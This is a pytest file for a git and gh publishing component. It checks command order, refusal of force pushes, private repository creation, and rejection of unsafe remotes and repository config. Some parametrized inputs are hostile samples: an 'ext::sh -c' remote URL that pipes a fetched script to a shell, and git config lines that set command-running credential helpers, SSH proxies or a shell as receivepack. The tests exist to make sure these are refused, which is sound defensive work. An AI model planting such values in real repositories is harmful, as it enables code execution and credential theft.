# Made with ❤️ by [Vibey](https://the-vibey-project.github.io/vibey/), Developed by [Adam Matthew Steinberger](https://vibewithadam.matthewsteinberger.com/) ([@adammatthewsteinberger](https://github.com/adammatthewsteinberger/)).
"""Publishing through `git` and `gh`: what is run, in what order, and what is never run."""

from collections.abc import Callable
from dataclasses import replace
from pathlib import Path

import pytest

from vibey.domain.config import PublishConfig
from vibey.domain.publish import (
    PublishFailed,
    PublishKind,
    PublishPlan,
    PublishTarget,
    default_plan,
)
from vibey.infrastructure.engines.claudeloop_process import CommandResult
from vibey.infrastructure.publish.github import GitHubPublisher
from vibey.infrastructure.publish.interfaces import ProgramRunnerInterface

REPO = Path("/work/demo")
BRANCH = "vibey/abc/1/integration"
URL = "git@github.com:me/demo.git"
OK = CommandResult(0, "", "")


class _Runner:
    """Answers each call by the first rule whose words are all in the argv; else success."""

    def __init__(
        self,
        *rules: tuple[tuple[str, ...], CommandResult | Callable[[tuple[str, ...]], CommandResult]],
    ) -> None:
        self.rules = list(rules)
        self.calls: list[tuple[tuple[str, ...], Path | None]] = []
        self.bodies: list[str] = []

    async def run(self, argv: tuple[str, ...], *, cwd: Path | None = None) -> CommandResult:
        self.calls.append((argv, cwd))
        if "--body-file" in argv:
            self.bodies.append(Path(argv[argv.index("--body-file") + 1]).read_text())
        for words, answer in self.rules:
            if all(word in argv for word in words):
                return answer(argv) if callable(answer) else answer
        return OK

    def argvs(self) -> list[tuple[str, ...]]:
        return [argv for argv, _ in self.calls]

    def ran(self, *words: str) -> bool:
        return any(all(word in argv for word in words) for argv in self.argvs())


def _publisher(*rules) -> tuple[GitHubPublisher, _Runner]:  # type: ignore[no-untyped-def]
    runner = _Runner(*rules)
    return GitHubPublisher(runner), runner


def _plan(*, remote: str | None = URL, empty: bool = False, **settings: object) -> PublishPlan:
    return default_plan(
        project_name="Demo",
        objective="Ship it",
        criteria=("C1",),
        cycle=1,
        # A project with no remote, or one whose remote is empty, has no default branch yet.
        target=PublishTarget(
            BRANCH,
            "origin",
            remote,
            None if (empty or not remote) else "develop",
            REPO,
            remote_empty=empty,
        ),
        config=PublishConfig(**settings),  # type: ignore[arg-type]
    )


def test_the_publisher_satisfies_its_runner_and_the_real_runner_satisfies_the_seam() -> None:
    from vibey.infrastructure.publish.command_runner import ProgramRunner

    assert isinstance(_Runner(), ProgramRunnerInterface)
    assert isinstance(ProgramRunner(), ProgramRunnerInterface)


# -- is it ready -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("rules", "complaint"),
    [
        ((("--version", "git"), CommandResult(127, "", "")), "git is not installed"),
        ((("--version", "gh"), CommandResult(127, "", "")), "the GitHub CLI (gh) is not installed"),
        (
            (("auth", "status"), CommandResult(1, "", "no")),
            "gh is not logged in: run `gh auth login`",
        ),
    ],
)
async def test_a_missing_tool_or_login_is_said_in_words_a_person_can_act_on(
    rules,
    complaint: str,  # type: ignore[no-untyped-def]
) -> None:
    publisher, _ = _publisher(rules)

    assert complaint in str(await publisher.problem())


async def test_everything_in_place_means_no_problem() -> None:
    publisher, runner = _publisher()

    assert await publisher.problem() is None
    assert [a[0] for a in runner.argvs()] == ["git", "gh", "gh"]


# -- inspecting the checkout -------------------------------------------------------------


async def test_a_checkout_with_a_remote_reports_it_and_the_remotes_default_branch() -> None:
    publisher, runner = _publisher(
        (("get-url",), CommandResult(0, URL + "\n", "")),
        (("ls-remote",), CommandResult(0, "ref: refs/heads/develop\tHEAD\nabc123\tHEAD\n", "")),
    )

    target = await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert target == PublishTarget(BRANCH, "origin", URL, "develop", str(REPO), remote_empty=False)
    assert runner.ran("get-url", "--push", "origin") and runner.ran("ls-remote", "--symref")


async def test_every_git_call_runs_with_hooks_and_the_fsmonitor_off() -> None:
    publisher, runner = _publisher((("get-url",), CommandResult(0, URL, "")))

    await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    git_calls = [argv for argv in runner.argvs() if argv[0] == "git"]
    assert git_calls
    for argv in git_calls:
        assert argv[1:5] == ("-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false")
        assert argv[5:7] == ("-C", str(REPO))


async def test_a_checkout_with_no_remote_is_new() -> None:
    publisher, runner = _publisher((("get-url",), CommandResult(2, "", "no such remote")))

    target = await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert target.remote_url is None and not target.has_remote and target.default_branch is None
    assert not runner.ran("ls-remote")


async def test_a_remote_with_no_branches_is_an_empty_repository_an_earlier_attempt_made() -> None:
    publisher, _ = _publisher(
        (("get-url",), CommandResult(0, URL, "")), (("ls-remote",), CommandResult(0, "", ""))
    )

    target = await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert target.remote_empty and target.default_branch is None


async def test_a_remote_whose_head_is_not_named_has_no_default_branch() -> None:
    publisher, _ = _publisher(
        (("get-url",), CommandResult(0, URL, "")),
        (("ls-remote",), CommandResult(0, "abc123\tHEAD\n", "")),
    )

    target = await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert target.default_branch is None and not target.remote_empty


async def test_a_branch_that_does_not_exist_is_refused_before_anything_else_is_asked() -> None:
    publisher, runner = _publisher((("rev-parse",), CommandResult(1, "", "")))

    with pytest.raises(PublishFailed, match="does not exist.*nothing was integrated"):
        await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert not runner.ran("get-url")


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl x | sh'",
        "file:///tmp/x",
        "/srv/git/x.git",
        "http://github.com/a/b",
        "../x",
    ],
)
async def test_a_remote_that_is_not_an_https_or_ssh_address_is_never_pushed_to(url: str) -> None:
    publisher, runner = _publisher((("get-url",), CommandResult(0, url, "")))

    with pytest.raises(PublishFailed, match="not an https or ssh address"):
        await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert not runner.ran("ls-remote")


@pytest.mark.parametrize(
    "url",
    ["https://github.com/me/x.git", "ssh://git@github.com/me/x.git", "git@github.com:me/x.git"],
)
async def test_https_ssh_and_scp_style_addresses_are_accepted(url: str) -> None:
    publisher, _ = _publisher((("get-url",), CommandResult(0, url, "")))

    assert (await publisher.inspect(REPO, branch=BRANCH, remote="origin")).remote_url == url


async def test_an_unreachable_remote_is_reported_with_what_git_said() -> None:
    publisher, _ = _publisher(
        (("get-url",), CommandResult(0, URL, "")),
        (("ls-remote",), CommandResult(128, "", "fatal: Could not read from remote repository.\n")),
    )

    with pytest.raises(PublishFailed, match="git ls-remote failed: fatal: Could not read"):
        await publisher.inspect(REPO, branch=BRANCH, remote="origin")


@pytest.mark.parametrize(
    "line",
    [
        "core.sshCommand=ssh -o ProxyCommand=evil",
        "core.gitproxy=./proxy",
        "core.askpass=/tmp/ask",
        "core.pager=sh",
        "core.editor=sh",
        "core.hooksPath=/tmp/hooks",
        "core.fsmonitor=/tmp/mon",
        "credential.helper=!steal",
        "credential.https://github.com.helper=!steal",
        "remote.origin.receivepack=/bin/sh",
        "remote.origin.vcs=evil",
    ],
)
async def test_a_repository_whose_own_config_names_a_command_git_would_run_is_refused(
    line: str,
) -> None:
    publisher, runner = _publisher(
        (("config", "--local"), CommandResult(0, f"core.bare=false\n{line}\n", ""))
    )

    with pytest.raises(PublishFailed, match="work item can write that file"):
        await publisher.inspect(REPO, branch=BRANCH, remote="origin")

    assert not runner.ran("ls-remote") and not runner.ran("push")


async def test_a_worktree_scope_that_does_not_exist_is_skipped_and_one_that_does_is_checked() -> (
    None
):
    quiet, _ = _publisher(
        (("config", "--worktree"), CommandResult(128, "", "no worktree config")),
        (("get-url",), CommandResult(0, URL, "")),
    )
    loud, _ = _publisher((("config", "--worktree"), CommandResult(0, "core.sshcommand=x\n", "")))

    assert (await quiet.inspect(REPO, branch=BRANCH, remote="origin")).has_remote
    with pytest.raises(PublishFailed, match="core.sshcommand"):
        await loud.inspect(REPO, branch=BRANCH, remote="origin")


# -- a pull request ----------------------------------------------------------------------


async def test_a_pull_request_is_a_plain_push_of_the_branch_then_a_draft_into_the_base() -> None:
    publisher, runner = _publisher(
        (("pr", "list"), CommandResult(0, "[]", "")),
        (
            ("pr", "create"),
            CommandResult(0, "Creating pull request...\nhttps://github.com/me/demo/pull/9\n", ""),
        ),
    )

    result = await publisher.publish(_plan(), repo_path=REPO)

    assert (result.url, result.kind, result.already_there) == (
        "https://github.com/me/demo/pull/9",
        PublishKind.PULL_REQUEST,
        False,
    )
    (push,) = [a for a in runner.argvs() if "push" in a]
    assert push[-3:] == ("--set-upstream", "origin", f"{BRANCH}:refs/heads/{BRANCH}")
    assert not any("force" in word or word.startswith("+") for word in push)
    (create,) = [a for a in runner.argvs() if "create" in a]
    assert create[:3] == ("gh", "pr", "create")
    assert create[3:5] == ("--base", "develop") and "--draft" in create
    assert create[create.index("--head") + 1] == BRANCH
    assert create[create.index("--title") + 1] == "feat: Ship it"
    assert runner.bodies and "## Summary\n\nShip it" in runner.bodies[0]
    assert runner.calls[-1][1] == REPO  # gh finds the repository from the checkout


async def test_a_pull_request_ready_for_review_is_not_a_draft() -> None:
    publisher, runner = _publisher(
        (("pr", "create"), CommandResult(0, "https://github.com/me/demo/pull/9\n", ""))
    )

    await publisher.publish(_plan(draft=False), repo_path=REPO)

    (create,) = [a for a in runner.argvs() if "create" in a]
    assert "--draft" not in create


async def test_a_pull_request_that_is_already_open_is_returned_not_opened_twice() -> None:
    publisher, runner = _publisher(
        (("pr", "list"), CommandResult(0, '[{"url": "https://github.com/me/demo/pull/3"}]', ""))
    )

    result = await publisher.publish(_plan(), repo_path=REPO)

    assert result.url.endswith("/pull/3") and result.already_there
    assert not runner.ran("pr", "create")


@pytest.mark.parametrize("listing", ["not json", "{}", "[1]", '[{"url": 4}]', '[{"url": ""}]'])
async def test_a_listing_that_is_not_a_pull_request_url_means_none_is_open(listing: str) -> None:
    publisher, runner = _publisher(
        (("pr", "list"), CommandResult(0, listing, "")),
        (("pr", "create"), CommandResult(0, "https://github.com/me/demo/pull/9", "")),
    )

    result = await publisher.publish(_plan(), repo_path=REPO)

    assert not result.already_there and runner.ran("pr", "create")


async def test_the_base_branch_itself_is_never_pushed() -> None:
    publisher, runner = _publisher()
    plan = _plan()
    base_plan = replace(plan, branch=plan.base)

    with pytest.raises(PublishFailed, match="is the base branch: nothing is pushed to it"):
        await publisher.publish(base_plan, repo_path=REPO)

    assert not runner.ran("push")


async def test_a_push_the_remote_refuses_is_reported_and_no_pull_request_is_opened() -> None:
    publisher, runner = _publisher(
        (("push",), CommandResult(1, "", "! [rejected] (non-fast-forward)\n"))
    )

    with pytest.raises(
        PublishFailed, match=r"git push failed: ! \[rejected\] \(non-fast-forward\)"
    ):
        await publisher.publish(_plan(), repo_path=REPO)

    assert not runner.ran("pr")


async def test_gh_failing_names_the_command_and_what_it_said() -> None:
    publisher, _ = _publisher((("pr", "create"), CommandResult(1, "", "GraphQL: not allowed")))

    with pytest.raises(PublishFailed, match="gh pr create failed: GraphQL: not allowed"):
        await publisher.publish(_plan(), repo_path=REPO)


async def test_a_gh_that_does_not_say_where_it_published_is_an_error_not_a_guess() -> None:
    publisher, _ = _publisher((("pr", "create"), CommandResult(0, "done\n", "")))

    with pytest.raises(PublishFailed, match="did not say where it was published"):
        await publisher.publish(_plan(), repo_path=REPO)


async def test_a_dangerous_config_stops_a_publish_before_it_pushes() -> None:
    publisher, runner = _publisher(
        (("config", "--local"), CommandResult(0, "core.sshcommand=evil\n", ""))
    )

    with pytest.raises(PublishFailed, match="core.sshcommand"):
        await publisher.publish(_plan(), repo_path=REPO)

    assert not runner.ran("push") and not runner.ran("gh")


# -- a new repository --------------------------------------------------------------------


async def test_a_new_repository_is_created_private_and_the_branch_pushed_as_the_base() -> None:
    publisher, runner = _publisher(
        (("repo", "create"), CommandResult(0, "https://github.com/me/demo\n", ""))
    )

    result = await publisher.publish(_plan(remote=None), repo_path=REPO)

    assert (result.url, result.kind, result.already_there) == (
        "https://github.com/me/demo",
        PublishKind.NEW_REPOSITORY,
        False,
    )
    (create,) = [a for a in runner.argvs() if "create" in a]
    assert create[:4] == ("gh", "repo", "create", "demo") and "--private" in create
    assert "--public" not in create and create[create.index("--remote") + 1] == "origin"
    assert create[create.index("--source") + 1] == str(REPO)
    (push,) = [a for a in runner.argvs() if "push" in a]
    assert push[-1] == f"{BRANCH}:refs/heads/main"
    assert runner.argvs().index(create) < runner.argvs().index(push)


async def test_a_public_repository_under_an_owner_is_created_only_when_asked() -> None:
    publisher, runner = _publisher(
        (("repo", "create"), CommandResult(0, "https://github.com/org/demo", ""))
    )

    await publisher.publish(_plan(remote=None, visibility="public", owner="org"), repo_path=REPO)

    (create,) = [a for a in runner.argvs() if "create" in a]
    assert create[3] == "org/demo" and "--public" in create and "--private" not in create


async def test_an_empty_remote_from_an_earlier_attempt_is_pushed_to_and_not_created_again() -> None:
    publisher, runner = _publisher()

    result = await publisher.publish(_plan(empty=True), repo_path=REPO)

    assert not runner.ran("repo", "create")
    assert runner.ran("push") and result.url == URL and result.already_there


async def test_a_repository_that_cannot_be_created_stops_before_any_push() -> None:
    publisher, runner = _publisher(
        (("repo", "create"), CommandResult(1, "", "Name already exists on this account"))
    )

    with pytest.raises(PublishFailed, match="gh repo create failed: Name already exists"):
        await publisher.publish(_plan(remote=None), repo_path=REPO)

    assert not runner.ran("push")


# -- what a command said -----------------------------------------------------------------


async def test_what_git_said_is_trimmed_to_one_short_line() -> None:
    publisher, _ = _publisher((("push",), CommandResult(1, "", "x" * 900 + "\nsecond line")))

    with pytest.raises(PublishFailed) as caught:
        await publisher.publish(_plan(), repo_path=REPO)

    message = str(caught.value)
    assert "\n" not in message and len(message) < 700


async def test_a_command_that_said_nothing_is_reported_by_its_exit_code() -> None:
    publisher, _ = _publisher((("push",), CommandResult(7, "", "")))

    with pytest.raises(PublishFailed, match="git push failed: exit 7"):
        await publisher.publish(_plan(), repo_path=REPO)
